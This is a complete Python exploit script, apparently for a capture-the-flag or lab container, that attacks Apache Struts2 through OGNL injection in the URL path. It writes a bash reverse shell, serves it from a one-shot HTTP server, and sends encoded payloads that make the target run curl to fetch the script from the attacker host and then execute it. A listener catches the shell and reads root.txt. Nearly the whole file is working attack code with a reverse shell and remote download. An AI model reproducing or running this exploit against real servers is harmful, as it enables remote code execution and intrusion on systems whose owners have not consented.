#!/usr/bin/env python3
import http.server
import socketserver
import threading
import time
import os
import requests
import socket
import sys
import netifaces
import subprocess
from functools import partial
sys.stdout.reconfigure(line_buffering=True)

def kill_port(port):
    # Find process using the port and kill it
    try:
        result = subprocess.run(
            ["lsof", "-i", f":{port}"], capture_output=True, text=True
        )
        lines = result.stdout.strip().split('\n')
        for line in lines[1:]:  # Skip header
            pid = int(line.split()[1])
            print(f"Killing process {pid} using port {port}")
            os.kill(pid, 9)
    except Exception as e:
        print(f"Could not kill process on port {port}: {e}")

class OneShotHandler(http.server.SimpleHTTPRequestHandler):

    def do_GET(self):
        if self.path == '/shell.sh':
            print(f"[+] Serving shell.sh to {self.client_address}")
            super().do_GET()
            threading.Thread(target=self.server.shutdown).start()  # shutdown after serving
        else:
            print(f"[!] Denied request to {self.path} from {self.client_address}")
            self.send_error(403, "Forbidden")

    def log_message(self, format, *args):
        return  # Suppress default logging

# Create the reverse shell script that will be served by the HTTP server
def create_shell_script(ip_address):
    script_path = '/attacker/scripts/multi_step/shell.sh'
    with open(script_path, 'w') as f:
        f.write(
            f'''#!/bin/bash\nbash -i >& /dev/tcp/{ip_address}/9999 0>&1'''
            )
    os.chmod(script_path, 0o755)
    print("[+] Created shell.sh reverse shell script")

# Start HTTP server on port 8888
def start_http_server():
    serve_directory = '/attacker/scripts/multi_step/'

    handler = partial(OneShotHandler, directory=serve_directory)
    kill_port(8888)
    with socketserver.TCPServer(("0.0.0.0", 8888), handler) as httpd:
        print(f"[+] HTTP server started on 0.0.0.0:8888")
        httpd.serve_forever()

# Start a Python-based listener on port 9999
# This will be used to receive the reverse shell connection
def start_python_listener():
    kill_port(9999)
    try:

        print("[+] Using Python-based listener on port 9999")
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(('0.0.0.0', 9999))
        server_socket.listen(1)

        print("[+] Waiting for incoming connections...")
        conn, addr = server_socket.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")

        commands = [
            "find / -type f -name 'root.txt' 2>/dev/null",
            "cat /root/root.txt"
        ]

        print("[*] Sending commands to the shell:")
        for cmd in commands:
                print(f"[>] Executing: {cmd}")
                conn.send(f"{cmd}\n".encode())
                time.sleep(1)

                # Get response
                response = b""
                conn.settimeout(2)
                try:
                    while True:
                        data = conn.recv(4096)
                        if not data:
                            break
                        response += data
                except socket.timeout:
                    pass

                print("[<] Response:")
                print(response.decode('utf-8', errors='ignore'))
        conn.close()
    except Exception as e:
        print(f"[!] Error in listener: {e}")
        return 1
    finally:
        # Close the connection
        try:

            server_socket.close()
            conn.close()

        except NameError:
            pass  # conn may not be defined if no connection was made
        except Exception as e:
            print(f"[!] Error closing connection: {e}")
    return 0
    # Close the connection


# Execute the Struts2 exploit
def execute_exploit(ip_container, port_container, ip_address, path):
    print("[+] Waiting for servers to start...")
    time.sleep(2)  # Give servers time to start

    print("[+] Executing Struts2 exploit...")

    url1 = f"http://{ip_container}:{port_container}/{path}/%24%7B%0A%28%23dm%3D%40ognl%2EOgnlContext%40DEFAULT%5FMEMBER%5FACCESS%29%2E%28%23ct%3D%23request%5B%27struts%2EvalueStack%27%5D%2Econtext%29%2E%28%23cr%3D%23ct%5B%27com%2Eopensymphony%2Exwork2%2EActionContext%2Econtainer%27%5D%29%2E%28%23ou%3D%23cr%2EgetInstance%28%40com%2Eopensymphony%2Exwork2%2Eognl%2EOgnlUtil%40class%29%29%2E%28%23ou%2EgetExcludedPackageNames%28%29%2Eclear%28%29%29%2E%28%23ou%2EgetExcludedClasses%28%29%2Eclear%28%29%29%2E%28%23ct%2EsetMemberAccess%28%23dm%29%29%2E%28%23a%3D%40java%2Elang%2ERuntime%40getRuntime%28%29%2Eexec%28%27curl%20-O%20http://{ip_address}:8888/shell.sh%27%29%29%2E%28%40org%2Eapache%2Ecommons%2Eio%2EIOUtils%40toString%28%23a%2EgetInputStream%28%29%29%29%7D/actionChain1.action"
    url2 = f"http://{ip_container}:{port_container}/{path}/%24%7B%0A%28%23dm%3D%40ognl%2EOgnlContext%40DEFAULT%5FMEMBER%5FACCESS%29%2E%28%23ct%3D%23request%5B%27struts%2EvalueStack%27%5D%2Econtext%29%2E%28%23cr%3D%23ct%5B%27com%2Eopensymphony%2Exwork2%2EActionContext%2Econtainer%27%5D%29%2E%28%23ou%3D%23cr%2EgetInstance%28%40com%2Eopensymphony%2Exwork2%2Eognl%2EOgnlUtil%40class%29%29%2E%28%23ou%2EgetExcludedPackageNames%28%29%2Eclear%28%29%29%2E%28%23ou%2EgetExcludedClasses%28%29%2Eclear%28%29%29%2E%28%23ct%2EsetMemberAccess%28%23dm%29%29%2E%28%23a%3D%40java%2Elang%2ERuntime%40getRuntime%28%29%2Eexec%28%27bash%20shell.sh%27%29%29%2E%28%40org%2Eapache%2Ecommons%2Eio%2EIOUtils%40toString%28%23a%2EgetInputStream%28%29%29%29%7D/actionChain1.action"

    urls = [url1, url2]

    for i, url in enumerate(urls):
        try:
            if i == 0:
                print(f"[+] Sending first request to download shell.sh")
            elif i == 1:
                print(f"[+] Sending second request to execute shell.sh")
            response = requests.get(url, allow_redirects=False)
            if 'Location' not in response.headers:
                print("[+] Exploit failed")
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed: {e}")

if __name__ == "__main__":
    print("[+] Starting exploit framework...")
    if len(sys.argv) != 5:
        print("Usage: python exploit.py <attacker_ip> <container_ip> <container_port> <path>")
        sys.exit(1)
    # Get the attacker IP address and container IP address from command line arguments
    attacker_ip = sys.argv[1]
    container_ip = sys.argv[2]
    container_port = sys.argv[3]
    path = sys.argv[4]
    # Create the shell script
    create_shell_script(attacker_ip)

    http_thread = threading.Thread(target=start_http_server)
    netcat_thread = threading.Thread(target=start_python_listener)

    http_thread.start()
    netcat_thread.start()

    execute_exploit(container_ip, container_port, attacker_ip, path)

    netcat_thread.join()
    print("[+] Exploit executed")
